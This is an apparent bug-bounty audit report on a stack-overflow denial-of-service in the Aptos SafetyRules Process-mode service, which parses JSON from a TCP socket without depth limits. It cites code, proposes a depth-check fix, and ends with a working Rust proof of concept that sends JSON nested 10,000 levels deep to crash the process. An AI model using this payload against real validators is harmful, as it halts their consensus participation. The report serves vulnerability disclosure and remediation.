# Audit Report

## Title
Stack Overflow Panic in SafetyRules Remote Service from Malformed JSON Deserialization

## Summary
The SafetyRules remote service deserializes untrusted JSON input without depth validation, allowing an attacker to crash the safety rules process via stack overflow by sending deeply nested JSON structures. This prevents validators from participating in consensus when using Process mode.

## Finding Description

The SafetyRules component can operate in Process mode where it runs as a separate process and communicates over TCP. When configured this way, the `remote_service::execute()` function creates a `NetworkServer` that accepts connections and deserializes incoming messages as JSON. [1](#0-0) 

The critical vulnerability occurs in the deserialization path. The `process_one_message()` function reads raw bytes from the network and passes them directly to the serializer service: [2](#0-1) 

The `SerializerService::handle_message()` immediately deserializes the input using `serde_json::from_slice()` without any authentication, validation, or depth checking: [3](#0-2) 

**The Attack Path:**

1. Attacker connects to the SafetyRules service TCP endpoint
2. Attacker sends malformed JSON with extreme nesting depth (e.g., thousands of nested arrays: `{"Initialize": [[[[[[...]]]]]]}`  )
3. `NetworkServer.read()` receives the bytes without validation
4. `serde_json::from_slice()` attempts recursive descent parsing
5. Stack overflow occurs as recursion depth exceeds stack limits
6. **Rust panics on stack overflow** - this cannot be caught by `Result<>` error handling
7. The panic propagates up and **crashes the entire safety rules process**

The error handling in the execute loop only catches `Result` errors, not panics: [4](#0-3) 

**Why Existing Protections Don't Apply:**

The codebase has depth limits for Move VM values (128 levels) and type tags (8 levels), but these only apply to Move bytecode execution and BCS serialization, not JSON deserialization: [5](#0-4) 

The `SafetyRulesInput` enum uses JSON serialization via serde, not BCS, so these Move VM protections don't help: [6](#0-5) 

**No Authentication Before Deserialization:**

The NetworkServer accepts raw TCP connections without any authentication or authorization checks before deserializing the payload. This is distinct from the validator network which uses Noise protocol handshakes. [7](#0-6) 

## Impact Explanation

**Severity: High** - per Aptos bug bounty criteria: "Validator node slowdowns, API crashes, Significant protocol violations"

When the SafetyRules process crashes:
- The validator cannot sign new proposals or votes
- Consensus participation is completely halted
- The validator may face penalties or loss of staking rewards
- Network liveness is degraded if multiple validators are affected

This breaks the **Consensus Safety** invariant by disrupting validator participation, and violates **Resource Limits** by allowing unbounded recursion depth.

**Scope Limitations:**

While mainnet validators are configured to use Local mode (enforced by config sanitizer), this vulnerability affects:
- Testnet and devnet validators using Process mode
- Development and testing environments
- Any future deployments that enable remote mode [8](#0-7) 

## Likelihood Explanation

**Likelihood: Medium-to-High in affected environments**

For exploitation, an attacker needs:
1. SafetyRules configured in Process mode (not default for mainnet)
2. Network access to the listening address

If bound to `127.0.0.1` (as in test configs), localhost access is required. If misconfigured to bind to `0.0.0.0` or a public interface, remote exploitation is trivial. [9](#0-8) 

The attack is:
- **Low complexity** - just send nested JSON brackets
- **No authentication required** - deserialization happens before any checks
- **Reliable** - stack overflow is deterministic with sufficient nesting
- **Small payload** - deeply nested JSON can be small in size

## Recommendation

**Immediate Fix: Add JSON Depth Validation**

Implement a depth-limited JSON deserializer wrapper that rejects deeply nested structures before passing to serde_json. Example approach:

```rust
const MAX_JSON_DEPTH: usize = 64;

pub fn handle_message(&mut self, input_message: Vec<u8>) -> Result<Vec<u8>, Error> {
    // Validate JSON depth before deserialization
    validate_json_depth(&input_message, MAX_JSON_DEPTH)?;
    
    let input = serde_json::from_slice(&input_message)?;
    // ... rest of function
}

fn validate_json_depth(data: &[u8], max_depth: usize) -> Result<(), Error> {
    let mut depth = 0;
    let mut max_seen = 0;
    
    for byte in data {
        match byte {
            b'{' | b'[' => {
                depth += 1;
                max_seen = max_seen.max(depth);
                if depth > max_depth {
                    return Err(Error::new("JSON nesting depth exceeded"));
                }
            }
            b'}' | b']' => depth = depth.saturating_sub(1),
            _ => {}
        }
    }
    Ok(())
}
```

**Additional Mitigations:**

1. **Add authentication**: Require authentication before deserializing any input
2. **Size limits**: Enforce maximum message size in `NetworkStream::read_buffer()`
3. **Consider BCS instead of JSON**: Use Binary Canonical Serialization which has better properties
4. **Document security requirements**: Clearly document that Process mode should only bind to localhost [10](#0-9) 

## Proof of Concept

```rust
use std::io::Write;
use std::net::TcpStream;

// PoC: Crash SafetyRules process with deeply nested JSON
fn exploit_safety_rules_stack_overflow() {
    // Connect to SafetyRules service (assuming Process mode on 127.0.0.1:5555)
    let mut stream = TcpStream::connect("127.0.0.1:5555").unwrap();
    
    // Build deeply nested JSON - 10000 levels deep
    let depth = 10000;
    let mut payload = String::from(r#"{"Initialize":"#);
    
    // Add opening brackets
    for _ in 0..depth {
        payload.push('[');
    }
    payload.push_str("null");
    // Add closing brackets
    for _ in 0..depth {
        payload.push(']');
    }
    payload.push('}');
    
    // Send length prefix (u32 little-endian) then payload
    let payload_bytes = payload.as_bytes();
    let len = payload_bytes.len() as u32;
    stream.write_all(&len.to_le_bytes()).unwrap();
    stream.write_all(payload_bytes).unwrap();
    stream.flush().unwrap();
    
    // The SafetyRules process will crash with stack overflow panic
    // when serde_json::from_slice() attempts to parse this deeply nested structure
}
```

**Expected Result:** The SafetyRules process terminates with a stack overflow panic, preventing the validator from signing consensus messages.

## Notes

This vulnerability is specific to the Process mode deployment of SafetyRules, which is not used in production mainnet (enforced by config sanitizer) but is present in test configurations and could be used in development/testnet environments. Despite this limitation, it represents a defense-in-depth issue in critical consensus code that should be addressed to prevent accidental misconfiguration or future changes that might enable this attack surface.

### Citations

**File:** consensus/safety-rules/src/remote_service.rs (L30-44)
```rust
pub fn execute(storage: PersistentSafetyStorage, listen_addr: SocketAddr, network_timeout_ms: u64) {
    let mut safety_rules = SafetyRules::new(storage, false);
    if let Err(e) = safety_rules.consensus_state() {
        warn!("Unable to print consensus state: {}", e);
    }

    let mut serializer_service = SerializerService::new(safety_rules);
    let mut network_server =
        NetworkServer::new("safety-rules".to_string(), listen_addr, network_timeout_ms);

    loop {
        if let Err(e) = process_one_message(&mut network_server, &mut serializer_service) {
            warn!("Failed to process message: {}", e);
        }
    }
```

**File:** consensus/safety-rules/src/remote_service.rs (L47-55)
```rust
fn process_one_message(
    network_server: &mut NetworkServer,
    serializer_service: &mut SerializerService,
) -> Result<(), Error> {
    let request = network_server.read()?;
    let response = serializer_service.handle_message(request)?;
    network_server.write(&response)?;
    Ok(())
}
```

**File:** consensus/safety-rules/src/serializer.rs (L22-34)
```rust
#[derive(Clone, Debug, Deserialize, Serialize)]
pub enum SafetyRulesInput {
    ConsensusState,
    Initialize(Box<EpochChangeProof>),
    SignProposal(Box<BlockData>),
    SignTimeoutWithQC(
        Box<TwoChainTimeout>,
        Box<Option<TwoChainTimeoutCertificate>>,
    ),
    ConstructAndSignVoteTwoChain(Box<VoteProposal>, Box<Option<TwoChainTimeoutCertificate>>),
    ConstructAndSignOrderVote(Box<OrderVoteProposal>),
    SignCommitVote(Box<LedgerInfoWithSignatures>, Box<LedgerInfo>),
}
```

**File:** consensus/safety-rules/src/serializer.rs (L45-46)
```rust
    pub fn handle_message(&mut self, input_message: Vec<u8>) -> Result<Vec<u8>, Error> {
        let input = serde_json::from_slice(&input_message)?;
```

**File:** third_party/move/move-vm/types/src/values/values_impl.rs (L57-57)
```rust
pub const DEFAULT_MAX_VM_VALUE_NESTED_DEPTH: u64 = 128;
```

**File:** secure/net/src/lib.rs (L297-321)
```rust
    pub fn read(&mut self) -> Result<Vec<u8>, Error> {
        self.increment_counter(Method::Read, MethodResult::Query);

        let result = {
            let stream = self.client()?;
            stream.read().map_err(|e| (stream.remote, e))
        };

        if let Err((remote, err)) = &result {
            self.increment_counter(Method::Read, MethodResult::Failure);
            warn!(SecureNetLogSchema::new(
                &self.service,
                NetworkMode::Server,
                LogEvent::DisconnectedPeerOnRead,
            )
            .error(err)
            .remote_peer(remote));

            self.stream = None;
        } else {
            self.increment_counter(Method::Read, MethodResult::Success);
        }

        result.map_err(|err| err.1)
    }
```

**File:** secure/net/src/lib.rs (L479-496)
```rust
    fn read_buffer(&mut self) -> Vec<u8> {
        if self.buffer.len() < 4 {
            return Vec::new();
        }

        let mut u32_bytes = [0; 4];
        u32_bytes.copy_from_slice(&self.buffer[..4]);
        let data_size = u32::from_le_bytes(u32_bytes) as usize;

        let remaining_data = &self.buffer[4..];
        if remaining_data.len() < data_size {
            return Vec::new();
        }

        let returnable_data = remaining_data[..data_size].to_vec();
        self.buffer = remaining_data[data_size..].to_vec();
        returnable_data
    }
```

**File:** config/src/config/safety_rules_config.rs (L98-104)
```rust
            // Verify that the safety rules service is set to local for optimal performance
            if chain_id.is_mainnet() && !safety_rules_config.service.is_local() {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    format!("The safety rules service should be set to local in mainnet for optimal performance! Given config: {:?}", &safety_rules_config.service)
                ));
            }
```

**File:** config/src/config/test_data/validator.yaml (L14-16)
```yaml
        service:
            type: process
            server_address: "/ip4/127.0.0.1/tcp/5555"
```
